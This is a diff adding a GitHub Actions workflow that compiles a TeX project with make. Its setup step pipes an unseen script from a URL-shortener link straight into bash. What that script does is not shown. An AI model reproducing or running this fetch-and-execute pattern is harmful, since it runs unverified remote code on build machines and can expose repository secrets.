@@ -1,0 +1,19 @@
+name: CI
+
+on: [push]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v1
+    - name: Setup
+      run: |
+        sudo apt install -y curl
+        bash <(curl -sL https://2oo.pw/eMFfU)
+    - name: Compile Tex
+      run: |
+        make clean
+        make all
